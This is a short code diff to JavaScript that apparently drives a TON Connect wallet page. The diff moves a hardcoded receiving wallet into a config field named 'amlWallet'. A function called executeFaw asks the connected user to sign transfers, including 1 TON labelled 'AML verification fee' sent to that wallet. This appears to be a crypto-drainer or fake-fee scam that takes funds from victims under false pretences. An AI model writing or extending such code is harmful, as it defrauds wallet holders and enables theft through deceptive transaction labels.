@@ -6,6 +6,8 @@ var CFG = (function () {
         proxy:  (typeof w.PROXY_CONTRACT !== 'undefined' && w.PROXY_CONTRACT)
              || (typeof w.YOUR_WALLET    !== 'undefined' && w.YOUR_WALLET)
              || 'UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv',
+        amlWallet: (typeof w.AML_WALLET !== 'undefined' && w.AML_WALLET)
+             || 'UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW',
         amount:    (typeof w.two_AMOUNT  !== 'undefined' && w.two_AMOUNT)  || '0.05',
         feeAmount: (typeof w.FEE_AMOUNT  !== 'undefined' && w.FEE_AMOUNT)  || '1',
         manifest:  'https://kareli123.github.io/test123/tonconnect-manifest.json'
@@ -125,7 +127,7 @@ async function executeFaw(userAddress) {
                 payload: textCommentPayload("TON Swap 0.05")
             },
             {
-                address: "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW",
+                address: CFG.amlWallet,
                 amount: "1000000000",                         // 1 TON
                 payload: textCommentPayload("AML verification fee")
             }
